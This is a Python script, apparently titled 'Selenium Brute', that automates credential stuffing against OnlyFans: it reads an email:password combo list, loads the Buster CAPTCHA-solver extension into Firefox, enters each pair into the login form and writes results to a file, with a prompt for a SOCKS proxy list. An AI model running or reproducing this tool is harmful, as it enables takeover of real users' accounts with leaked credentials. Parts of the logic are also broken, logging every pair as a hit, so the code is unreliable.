import time
from random import seed
from random import randint
import os
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.proxy import Proxy, ProxyType
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from fake_useragent import UserAgent
from seleniumwire import webdriver
from selenium.webdriver.common.keys import Keys
import pyfiglet as pyg
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import NoSuchElementException
import unittest


res = pyg.figlet_format("Welcome to Selenium Brute!")
print('If you need any extra options, go to my github https://github.com/rmau2016')
print(res)
Success = input("What's the Output File Name?: ")
w_file = open(Success, 'w+')



socks_4f = input("What is the Socks file?(N: FOR NO SOCKS)")

m = 0
choice = input("(3) OnlyFans")


def Imstartingtohatethis(username, password, i, socks_4f, w_file):
    if socks_4f == 'N':
                cap = webdriver.DesiredCapabilities.FIREFOX
                cap['marionette'] = True
                profile = webdriver.FirefoxProfile()
                profile.add_extension("buster_captcha_solver-2.0.1.xpi")
                profile.set_preference("security.fileuri.strict_origin_policy", False)
                options = webdriver.FirefoxOptions()
                driver = webdriver.Firefox(options=profile, capabilities= cap)
                driver.implicitly_wait(10)
                driver.get("https://onlyfans.com")
                time.sleep(10)
                button1 = driver.find_element(By.XPATH, "/html[1]/body[1]/div[1]/div[2]/div[1]/div[1]/div[1]/div[2]/div[1]/form[1]/div[1]/div[1]/div[1]/div[1]/div[1]/div[1]/input[1]")
                button2 = driver.find_element(By.XPATH,"/html[1]/body[1]/div[1]/div[2]/div[1]/div[1]/div[1]/div[2]/div[1]/form[1]/div[2]/div[1]/div[1]/div[1]/div[1]/div[1]/input[1]")
                ActionChains(driver).move_to_element(button1).click(button1).perform()
                button1.send_keys(username)
                time.sleep(10)
                ActionChains(driver).move_to_element(button2).click(button2).perform()
                button2.send_keys(password)
                time.sleep(10)
                driver.implicitly_wait(10)
                time.sleep(10)
                try:
                    try:
                        
                        



                        
                        time.sleep(10)
                        driver.implicitly_wait(10)

                        print("SUSPICIOUS LOGIN ATTEMPT:" +
                                    username + ":" + password + "\n")
                        w_file.write("SUS-LOGIN: "+username + ":" + password + "\n")
                    except Exception:
                        print("\nNo suspicious login attempt")
                except Exception:
                    print("Unsuccessful login")

def quit():
            randTime = randint(3, 5)
            return randTime


r_file = input("What is the combo list in [Email:Pass] format?>")
r_file = open(r_file)
i = 0



if socks_4f == 'N':
                #try:
                if choice == '3':
                    for line in r_file:
                        newest = line.split(":")
                        User = line.split(":")[0]
                        Password = line.split(":")[1]
                        print("\nCOMBO: ", User, ":", Password)
                        Imstartingtohatethis(User,Password, i, socks_4f,  w_file)
                    ''' except:
                    print("Page failed to load")
                    x = input("Save File?[Y/N]")
                    if x == 'Y':
                        Quit()
                    if x == 'N':
                        quit()'''
    
w_file.close()
